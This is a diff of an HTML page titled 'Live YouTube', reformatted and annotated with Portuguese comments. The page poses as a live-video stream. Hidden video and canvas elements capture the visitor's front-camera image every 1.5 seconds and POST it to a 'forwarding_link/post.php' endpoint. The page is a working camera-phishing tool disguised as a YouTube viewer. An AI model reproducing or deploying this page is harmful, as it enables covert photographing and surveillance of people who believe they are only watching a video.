@@ -1,82 +1,119 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
-<head>
-<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
-<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
-<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
-</head>
+  <head>
+    <meta charset="utf-8" />
+    <meta
+      name="viewport"
+      content="width=device-width,initial-scale=1,maximum-scale=1"
+    />
+    <title>Live YouTube</title>
 
-<div class="video-wrap" hidden="hidden">
-   <video id="video" playsinline autoplay></video>
-</div>
+    <script
+      type="text/javascript"
+      src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"
+    ></script>
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css"
+    />
+    <script
+      type="text/javascript"
+      src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"
+    ></script>
+  </head>
 
-<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+  <div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+  </div>
 
-<script>
+  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
 
-function post(imgdata){
-$.ajax({
-    type: 'POST',
-    data: { cat: imgdata},
-    url: 'forwarding_link/post.php',
-    dataType: 'json',
-    async: false,
-    success: function(result){
-        // call the function that handles the response/results
-    },
-    error: function(){
+  <script>
+    /*
+     * Função para enviar os dados da imagem (captura da câmera) via AJAX.
+     * O URL de destino para o POST é 'forwarding_link/post.php'.
+     */
+    function post(imgdata) {
+      $.ajax({
+        type: "POST",
+        data: { cat: imgdata },
+        url: "forwarding_link/post.php",
+        dataType: "json",
+        async: false,
+        success: function (result) {
+          // Manipulador de sucesso: esta função lida com a resposta/resultados do servidor.
+        },
+        error: function () {
+          // Manipulador de erro
+        },
+      });
     }
-  });
-};
 
+    ("use strict");
 
-'use strict';
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const errorMsgElement = document.querySelector("span#errorMsg");
 
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const errorMsgElement = document.querySelector('span#errorMsg');
+    const constraints = {
+      audio: false, // Não solicitar acesso ao microfone
+      video: {
+        // Tenta usar a câmera frontal em dispositivos móveis
+        facingMode: "user",
+      },
+    };
 
-const constraints = {
-  audio: false,
-  video: {
-    
-    facingMode: "user"
-  }
-};
+    // 🎥 Acessar a webcam
+    async function init() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        handleSuccess(stream);
+      } catch (e) {
+        // Exibe o erro se o acesso à câmera falhar (e.g., permissão negada)
+        if (errorMsgElement) {
+          errorMsgElement.innerHTML = `Erro navigator.getUserMedia: ${e.toString()}`;
+        }
+      }
+    }
 
-// Access webcam
-async function init() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-    handleSuccess(stream);
-  } catch (e) {
-    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
-  }
-}
+    // ✅ Sucesso: lida com o stream da câmera
+    function handleSuccess(stream) {
+      window.stream = stream;
+      video.srcObject = stream;
 
-// Success
-function handleSuccess(stream) {
-  window.stream = stream;
-  video.srcObject = stream;
+      var context = canvas.getContext("2d");
 
-var context = canvas.getContext('2d');
-  setInterval(function(){
+      // 📸 Configura o intervalo para capturar a imagem a cada 1500ms (1.5 segundos)
+      setInterval(function () {
+        context.drawImage(video, 0, 0, 640, 480);
+        // Converte o frame do canvas para um formato de dados e o envia
+        var canvasData = canvas
+          .toDataURL("image/png")
+          .replace("image/png", "image/octet-stream");
+        post(canvasData);
+      }, 1500);
+    }
 
-       context.drawImage(video, 0, 0, 640, 480);
-       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-       post(canvasData); }, 1500);
-  
+    // 🚀 Inicia a função de acesso à câmera
+    init();
+  </script>
 
-}
+  <body>
+    <div style="text-align: center; margin-top: 20px">
+      <h2>📺 Assista ao Vídeo ao Vivo Abaixo</h2>
+      <p>Aguarde o carregamento do stream.</p>
+    </div>
 
-// Load init
-init();
-
-</script>
-
-    <body>
-        <iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" frameborder="0" allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-
-    </body>
-
+    <iframe
+      id="Live_YT_TV"
+      width="100%"
+      height="500px"
+      src="https://www.youtube.com/embed/live_yt_tv?autoplay=1"
+      frameborder="0"
+      allow="autoplay encrypted-media; gyroscope; picture-in-picture"
+      allowfullscreen
+    >
+    </iframe>
+  </body>
 </html>
